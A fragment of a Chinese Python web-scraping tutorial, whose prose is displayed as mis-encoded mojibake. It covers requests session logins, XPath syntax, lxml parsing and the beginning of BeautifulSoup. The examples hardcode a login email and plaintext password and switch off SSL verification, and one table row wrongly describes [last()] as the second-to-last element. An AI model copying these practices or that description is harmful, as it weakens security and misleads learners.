class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://www.renren.com/PLogin.do&quot;</span></span><br><span class="line">data = &#123;<span class="string">&quot;email&quot;</span>:<span class="string">&quot;970138074@qq.com&quot;</span>,<span class="string">&#x27;password&#x27;</span>:<span class="string">&quot;pythonspider&quot;</span>&#125;</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç™»å½•</span></span><br><span class="line">session = requests.session()</span><br><span class="line">session.post(url,data=data,headers=headers)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¿é—®å¤§é¹ä¸ªäººä¸­å¿ƒ</span></span><br><span class="line">resp = session.get(<span class="string">&#x27;http://www.renren.com/880151247/profile&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(resp.text)</span><br></pre></td></tr></table></figure><h2 id="å¤„ç†ä¸ä¿¡ä»»çš„SSLè¯ä¹¦ï¼š"><a href="#å¤„ç†ä¸ä¿¡ä»»çš„SSLè¯ä¹¦ï¼š" class="headerlink" title="å¤„ç†ä¸ä¿¡ä»»çš„SSLè¯ä¹¦ï¼š"></a>å¤„ç†ä¸ä¿¡ä»»çš„SSLè¯ä¹¦ï¼š</h2><p>å¯¹äºé‚£äº›å·²ç»è¢«ä¿¡ä»»çš„SSLè¯ä¹¦çš„ç½‘ç«™ï¼Œæ¯”å¦‚<code>https://www.baidu.com/</code>ï¼Œé‚£ä¹ˆä½¿ç”¨<code>requests</code>ç›´æ¥å°±å¯ä»¥æ­£å¸¸çš„è¿”å›å“åº”ã€‚ç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">resp = requests.get(<span class="string">&#x27;http://www.12306.cn/mormhweb/&#x27;</span>,verify=<span class="literal">False</span>)</span><br><span class="line"><span class="built_in">print</span>(resp.content.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure><h1 id="XPathè¯­æ³•å’Œlxmlæ¨¡å—"><a href="#XPathè¯­æ³•å’Œlxmlæ¨¡å—" class="headerlink" title="XPathè¯­æ³•å’Œlxmlæ¨¡å—"></a>XPathè¯­æ³•å’Œlxmlæ¨¡å—</h1><h2 id="ä»€ä¹ˆæ˜¯XPathï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯XPathï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯XPathï¼Ÿ"></a>ä»€ä¹ˆæ˜¯XPathï¼Ÿ</h2><p>xpathï¼ˆXML Path Languageï¼‰æ˜¯ä¸€é—¨åœ¨XMLå’ŒHTMLæ–‡æ¡£ä¸­æŸ¥æ‰¾ä¿¡æ¯çš„è¯­è¨€ï¼Œå¯ç”¨æ¥åœ¨XMLå’ŒHTMLæ–‡æ¡£ä¸­å¯¹å…ƒç´ å’Œå±æ€§è¿›è¡Œéå†ã€‚</p><h2 id="XPathè¯­æ³•"><a href="#XPathè¯­æ³•" class="headerlink" title="XPathè¯­æ³•"></a>XPathè¯­æ³•</h2><h3 id="é€‰å–èŠ‚ç‚¹ï¼š"><a href="#é€‰å–èŠ‚ç‚¹ï¼š" class="headerlink" title="é€‰å–èŠ‚ç‚¹ï¼š"></a>é€‰å–èŠ‚ç‚¹ï¼š</h3><p>XPath ä½¿ç”¨è·¯å¾„è¡¨è¾¾å¼æ¥é€‰å– XML æ–‡æ¡£ä¸­çš„èŠ‚ç‚¹æˆ–è€…èŠ‚ç‚¹é›†ã€‚è¿™äº›è·¯å¾„è¡¨è¾¾å¼å’Œæˆ‘ä»¬åœ¨å¸¸è§„çš„ç”µè„‘æ–‡ä»¶ç³»ç»Ÿä¸­çœ‹åˆ°çš„è¡¨è¾¾å¼éå¸¸ç›¸ä¼¼ã€‚</p><div class="table-container"><table><thead><tr><th>è¡¨è¾¾å¼</th><th>æè¿°</th><th>ç¤ºä¾‹</th><th>ç»“æœ</th></tr></thead><tbody><tr><td>nodename</td><td>é€‰å–æ­¤èŠ‚ç‚¹çš„æ‰€æœ‰å­èŠ‚ç‚¹</td><td>bookstore</td><td>é€‰å–bookstoreä¸‹æ‰€æœ‰çš„å­èŠ‚ç‚¹</td></tr><tr><td>/</td><td>å¦‚æœæ˜¯åœ¨æœ€å‰é¢ï¼Œä»£è¡¨ä»æ ¹èŠ‚ç‚¹é€‰å–ã€‚å¦åˆ™é€‰æ‹©æŸèŠ‚ç‚¹ä¸‹çš„æŸä¸ªèŠ‚ç‚¹</td><td>/bookstore</td><td>é€‰å–æ ¹å…ƒç´ ä¸‹æ‰€æœ‰çš„bookstoreèŠ‚ç‚¹</td></tr><tr><td>//</td><td>ä»å…¨å±€èŠ‚ç‚¹ä¸­é€‰æ‹©èŠ‚ç‚¹ï¼Œéšä¾¿åœ¨å“ªä¸ªä½ç½®</td><td>//book</td><td>ä»å…¨å±€èŠ‚ç‚¹ä¸­æ‰¾åˆ°æ‰€æœ‰çš„bookèŠ‚ç‚¹</td></tr><tr><td>@</td><td>é€‰å–æŸä¸ªèŠ‚ç‚¹çš„å±æ€§</td><td>//book[@price]</td><td>é€‰æ‹©æ‰€æœ‰æ‹¥æœ‰priceå±æ€§çš„bookèŠ‚ç‚¹</td></tr><tr><td>.</td><td>å½“å‰èŠ‚ç‚¹</td><td>./a</td><td>é€‰å–å½“å‰èŠ‚ç‚¹ä¸‹çš„aæ ‡ç­¾</td></tr></tbody></table></div><h3 id="è°“è¯­ï¼š"><a href="#è°“è¯­ï¼š" class="headerlink" title="è°“è¯­ï¼š"></a>è°“è¯­ï¼š</h3><p>è°“è¯­ç”¨æ¥æŸ¥æ‰¾æŸä¸ªç‰¹å®šçš„èŠ‚ç‚¹æˆ–è€…åŒ…å«æŸä¸ªæŒ‡å®šçš„å€¼çš„èŠ‚ç‚¹ï¼Œè¢«åµŒåœ¨æ–¹æ‹¬å·ä¸­ã€‚<br>åœ¨ä¸‹é¢çš„è¡¨æ ¼ä¸­ï¼Œæˆ‘ä»¬åˆ—å‡ºäº†å¸¦æœ‰è°“è¯­çš„ä¸€äº›è·¯å¾„è¡¨è¾¾å¼ï¼Œä»¥åŠè¡¨è¾¾å¼çš„ç»“æœï¼š</p><div class="table-container"><table><thead><tr><th>è·¯å¾„è¡¨è¾¾å¼</th><th>æè¿°</th></tr></thead><tbody><tr><td>/bookstore/book[1]</td><td>é€‰å–bookstoreä¸‹çš„ç¬¬ä¸€ä¸ªå­å…ƒç´ </td></tr><tr><td>/bookstore/book[last()]</td><td>é€‰å–bookstoreä¸‹çš„å€’æ•°ç¬¬äºŒä¸ªbookå…ƒç´ ã€‚</td></tr><tr><td>bookstore/book[position()&lt;3]</td><td>é€‰å–bookstoreä¸‹å‰é¢ä¸¤ä¸ªå­å…ƒç´ ã€‚</td></tr><tr><td>//book[@price]</td><td>é€‰å–æ‹¥æœ‰priceå±æ€§çš„bookå…ƒç´ </td></tr><tr><td>//book[@price=10]</td><td>é€‰å–æ‰€æœ‰å±æ€§priceç­‰äº10çš„bookå…ƒç´ </td></tr></tbody></table></div><h3 id="é€šé…ç¬¦"><a href="#é€šé…ç¬¦" class="headerlink" title="é€šé…ç¬¦"></a>é€šé…ç¬¦</h3><p>*è¡¨ç¤ºé€šé…ç¬¦ã€‚</p><div class="table-container"><table><thead><tr><th style="text-align:left">é€šé…ç¬¦</th><th style="text-align:left">æè¿°</th><th style="text-align:left">ç¤ºä¾‹</th><th style="text-align:left">ç»“æœ</th></tr></thead><tbody><tr><td style="text-align:left">*</td><td style="text-align:left">åŒ¹é…ä»»æ„èŠ‚ç‚¹</td><td style="text-align:left">/bookstore/*</td><td style="text-align:left">é€‰å–bookstoreä¸‹çš„æ‰€æœ‰å­å…ƒç´ ã€‚</td></tr><tr><td style="text-align:left">@*</td><td style="text-align:left">åŒ¹é…èŠ‚ç‚¹ä¸­çš„ä»»ä½•å±æ€§</td><td style="text-align:left">//book[@*]</td><td style="text-align:left">é€‰å–æ‰€æœ‰å¸¦æœ‰å±æ€§çš„bookå…ƒç´ ã€‚</td></tr></tbody></table></div><h3 id="é€‰å–å¤šä¸ªè·¯å¾„ï¼š"><a href="#é€‰å–å¤šä¸ªè·¯å¾„ï¼š" class="headerlink" title="é€‰å–å¤šä¸ªè·¯å¾„ï¼š"></a>é€‰å–å¤šä¸ªè·¯å¾„ï¼š</h3><p>é€šè¿‡åœ¨è·¯å¾„è¡¨è¾¾å¼ä¸­ä½¿ç”¨â€œ|â€è¿ç®—ç¬¦ï¼Œå¯ä»¥é€‰å–è‹¥å¹²ä¸ªè·¯å¾„ã€‚<br>ç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//bookstore/book | //book/title</span><br><span class="line"># é€‰å–æ‰€æœ‰bookå…ƒç´ ä»¥åŠbookå…ƒç´ ä¸‹æ‰€æœ‰çš„titleå…ƒç´ </span><br></pre></td></tr></table></figure><h2 id="lxmlåº“"><a href="#lxmlåº“" class="headerlink" title="lxmlåº“"></a>lxmlåº“</h2><p>lxml æ˜¯ ä¸€ä¸ªHTML/XMLçš„è§£æå™¨ï¼Œä¸»è¦çš„åŠŸèƒ½æ˜¯å¦‚ä½•è§£æå’Œæå– HTML/XML æ•°æ®ã€‚</p><p>lxmlå’Œæ­£åˆ™ä¸€æ ·ï¼Œä¹Ÿæ˜¯ç”¨ C å®ç°çš„ï¼Œæ˜¯ä¸€æ¬¾é«˜æ€§èƒ½çš„ Python HTML/XML è§£æå™¨ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä¹‹å‰å­¦ä¹ çš„XPathè¯­æ³•ï¼Œæ¥å¿«é€Ÿçš„å®šä½ç‰¹å®šå…ƒç´ ä»¥åŠèŠ‚ç‚¹ä¿¡æ¯ã€‚</p><p>éœ€è¦å®‰è£…Cè¯­è¨€åº“ï¼Œå¯ä½¿ç”¨ pip å®‰è£…ï¼š<code>pip install lxml</code></p><h3 id="åŸºæœ¬ä½¿ç”¨ï¼š"><a href="#åŸºæœ¬ä½¿ç”¨ï¼š" class="headerlink" title="åŸºæœ¬ä½¿ç”¨ï¼š"></a>åŸºæœ¬ä½¿ç”¨ï¼š</h3><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä»–æ¥è§£æHTMLä»£ç ï¼Œå¹¶ä¸”åœ¨è§£æHTMLä»£ç çš„æ—¶å€™ï¼Œå¦‚æœHTMLä»£ç ä¸è§„èŒƒï¼Œä»–ä¼šè‡ªåŠ¨çš„è¿›è¡Œè¡¥å…¨ã€‚ç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ä½¿ç”¨ lxml çš„ etree åº“</span></span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree </span><br><span class="line"></span><br><span class="line">text = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;div&gt;</span></span><br><span class="line"><span class="string">    &lt;ul&gt;</span></span><br><span class="line"><span class="string">         &lt;li class=&quot;item-0&quot;&gt;&lt;a href=&quot;link1.html&quot;&gt;first item&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">         &lt;li class=&quot;item-1&quot;&gt;&lt;a href=&quot;link2.html&quot;&gt;second item&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">         &lt;li class=&quot;item-inactive&quot;&gt;&lt;a href=&quot;link3.html&quot;&gt;third item&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">         &lt;li class=&quot;item-1&quot;&gt;&lt;a href=&quot;link4.html&quot;&gt;fourth item&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">         &lt;li class=&quot;item-0&quot;&gt;&lt;a href=&quot;link5.html&quot;&gt;fifth item&lt;/a&gt; # æ³¨æ„ï¼Œæ­¤å¤„ç¼ºå°‘ä¸€ä¸ª &lt;/li&gt; é—­åˆæ ‡ç­¾</span></span><br><span class="line"><span class="string">     &lt;/ul&gt;</span></span><br><span class="line"><span class="string"> &lt;/div&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#åˆ©ç”¨etree.HTMLï¼Œå°†å­—ç¬¦ä¸²è§£æä¸ºHTMLæ–‡æ¡£</span></span><br><span class="line">html = etree.HTML(text) </span><br><span class="line"></span><br><span class="line"><span class="comment"># æŒ‰å­—ç¬¦ä¸²åºåˆ—åŒ–HTMLæ–‡æ¡£</span></span><br><span class="line">result = etree.tostring(html) </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><p>è¾“å…¥ç»“æœå¦‚ä¸‹ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;item-0&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;link1.html&quot;</span>&gt;</span>first item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;item-1&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;link2.html&quot;</span>&gt;</span>second item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;item-inactive&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;link3.html&quot;</span>&gt;</span>third item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;item-1&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;link4.html&quot;</span>&gt;</span>fourth item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;item-0&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;link5.html&quot;</span>&gt;</span>fifth item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ã€‚lxmlä¼šè‡ªåŠ¨ä¿®æ”¹HTMLä»£ç ã€‚ä¾‹å­ä¸­ä¸ä»…è¡¥å…¨äº†liæ ‡ç­¾ï¼Œè¿˜æ·»åŠ äº†bodyï¼Œhtmlæ ‡ç­¾ã€‚</p><h3 id="ä»æ–‡ä»¶ä¸­è¯»å–htmlä»£ç ï¼š"><a href="#ä»æ–‡ä»¶ä¸­è¯»å–htmlä»£ç ï¼š" class="headerlink" title="ä»æ–‡ä»¶ä¸­è¯»å–htmlä»£ç ï¼š"></a>ä»æ–‡ä»¶ä¸­è¯»å–htmlä»£ç ï¼š</h3><p>é™¤äº†ç›´æ¥ä½¿ç”¨å­—ç¬¦ä¸²è¿›è¡Œè§£æï¼Œlxmlè¿˜æ”¯æŒä»æ–‡ä»¶ä¸­è¯»å–å†…å®¹ã€‚æˆ‘ä»¬æ–°å»ºä¸€ä¸ªhello.htmlæ–‡ä»¶ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- hello.html --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;item-0&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;link1.html&quot;</span>&gt;</span>first item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;item-1&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;link2.html&quot;</span>&gt;</span>second item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;item-inactive&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;link3.html&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;bold&quot;</span>&gt;</span>third item<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;item-1&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;link4.html&quot;</span>&gt;</span>fourth item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;item-0&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;link5.html&quot;</span>&gt;</span>fifth item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ç„¶ååˆ©ç”¨<code>etree.parse()</code>æ–¹æ³•æ¥è¯»å–æ–‡ä»¶ã€‚ç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¯»å–å¤–éƒ¨æ–‡ä»¶ hello.html</span></span><br><span class="line">html = etree.parse(<span class="string">&#x27;hello.html&#x27;</span>)</span><br><span class="line">result = etree.tostring(html, pretty_print=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><p>è¾“å…¥ç»“æœå’Œä¹‹å‰æ˜¯ç›¸åŒçš„ã€‚</p><h3 id="åœ¨lxmlä¸­ä½¿ç”¨XPathè¯­æ³•ï¼š"><a href="#åœ¨lxmlä¸­ä½¿ç”¨XPathè¯­æ³•ï¼š" class="headerlink" title="åœ¨lxmlä¸­ä½¿ç”¨XPathè¯­æ³•ï¼š"></a>åœ¨lxmlä¸­ä½¿ç”¨XPathè¯­æ³•ï¼š</h3><ol><li><p>è·å–æ‰€æœ‰liæ ‡ç­¾ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">   </span><br><span class="line">html = etree.parse(<span class="string">&#x27;hello.html&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">type</span>(html)  <span class="comment"># æ˜¾ç¤ºetree.parse() è¿”å›ç±»å‹</span></span><br><span class="line">   </span><br><span class="line">result = html.xpath(<span class="string">&#x27;//li&#x27;</span>)</span><br><span class="line">   </span><br><span class="line"><span class="built_in">print</span>(result)  <span class="comment"># æ‰“å°&lt;li&gt;æ ‡ç­¾çš„å…ƒç´ é›†åˆ</span></span><br></pre></td></tr></table></figure></li><li><p>è·å–æ‰€æœ‰liå…ƒç´ ä¸‹çš„æ‰€æœ‰classå±æ€§çš„å€¼ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">   </span><br><span class="line">html = etree.parse(<span class="string">&#x27;hello.html&#x27;</span>)</span><br><span class="line">result = html.xpath(<span class="string">&#x27;//li/@class&#x27;</span>)</span><br><span class="line">   </span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure></li><li><p>è·å–liæ ‡ç­¾ä¸‹hrefä¸º<code>www.baidu.com</code>çš„aæ ‡ç­¾ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">   </span><br><span class="line">html = etree.parse(<span class="string">&#x27;hello.html&#x27;</span>)</span><br><span class="line">result = html.xpath(<span class="string">&#x27;//li/a[@href=&quot;www.baidu.com&quot;]&#x27;</span>)</span><br><span class="line">   </span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure></li><li><p>è·å–liæ ‡ç­¾ä¸‹æ‰€æœ‰spanæ ‡ç­¾ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">   </span><br><span class="line">html = etree.parse(<span class="string">&#x27;hello.html&#x27;</span>)</span><br><span class="line">   </span><br><span class="line"><span class="comment">#result = html.xpath(&#x27;//li/span&#x27;)</span></span><br><span class="line"><span class="comment">#æ³¨æ„è¿™ä¹ˆå†™æ˜¯ä¸å¯¹çš„ï¼š</span></span><br><span class="line"><span class="comment">#å› ä¸º / æ˜¯ç”¨æ¥è·å–å­å…ƒç´ çš„ï¼Œè€Œ &lt;span&gt; å¹¶ä¸æ˜¯ &lt;li&gt; çš„å­å…ƒç´ ï¼Œæ‰€ä»¥ï¼Œè¦ç”¨åŒæ–œæ </span></span><br><span class="line">   </span><br><span class="line">result = html.xpath(<span class="string">&#x27;//li//span&#x27;</span>)</span><br><span class="line">   </span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure></li><li><p>è·å–liæ ‡ç­¾ä¸‹çš„aæ ‡ç­¾é‡Œçš„æ‰€æœ‰classï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">   </span><br><span class="line">html = etree.parse(<span class="string">&#x27;hello.html&#x27;</span>)</span><br><span class="line">result = html.xpath(<span class="string">&#x27;//li/a//@class&#x27;</span>)</span><br><span class="line">   </span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure></li><li><p>è·å–æœ€åä¸€ä¸ªliçš„açš„hrefå±æ€§å¯¹åº”çš„å€¼ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">   </span><br><span class="line">html = etree.parse(<span class="string">&#x27;hello.html&#x27;</span>)</span><br><span class="line">   </span><br><span class="line">result = html.xpath(<span class="string">&#x27;//li[last()]/a/@href&#x27;</span>)</span><br><span class="line"><span class="comment"># è°“è¯­ [last()] å¯ä»¥æ‰¾åˆ°æœ€åä¸€ä¸ªå…ƒç´ </span></span><br><span class="line">   </span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure></li><li><p>è·å–å€’æ•°ç¬¬äºŒä¸ªliå…ƒç´ çš„å†…å®¹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">   </span><br><span class="line">html = etree.parse(<span class="string">&#x27;hello.html&#x27;</span>)</span><br><span class="line">result = html.xpath(<span class="string">&#x27;//li[last()-1]/a&#x27;</span>)</span><br><span class="line">   </span><br><span class="line"><span class="comment"># text æ–¹æ³•å¯ä»¥è·å–å…ƒç´ å†…å®¹</span></span><br><span class="line"><span class="built_in">print</span>(result[<span class="number">0</span>].text)</span><br></pre></td></tr></table></figure></li><li><p>è·å–å€’æ•°ç¬¬äºŒä¸ªliå…ƒç´ çš„å†…å®¹çš„ç¬¬äºŒç§æ–¹å¼ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">   </span><br><span class="line">html = etree.parse(<span class="string">&#x27;hello.html&#x27;</span>)</span><br><span class="line">result = html.xpath(<span class="string">&#x27;//li[last()-1]/a/text()&#x27;</span>)</span><br><span class="line">   </span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure></li></ol><h2 id="BeautifulSoup4åº“"><a href="#BeautifulSoup4åº“" class="headerlink" title="BeautifulSoup4åº“"></a>BeautifulSoup4åº“</h2><p>ä½¿ç”¨æµç¨‹ï¼š</p><ol><li>æ ¹æ®æ ‡ç­¾åè¿›è¡Œè·å–èŠ‚ç‚¹</li><li>è·å–æ–‡æœ¬å†…å®¹å’Œå±æ€§</li></ol><h3 id="å±æ€§"><a href="#å±æ€§" class="headerlink" title="å±æ€§"></a>å±æ€§</h3><blockquote><p>soup.a.attrs   è¿”å›ä¸€å­—å…¸ï¼Œé‡Œé¢æ˜¯æ‰€æœ‰å±æ€§å’Œå€¼<br> soup.a[â€˜hrefâ€™] 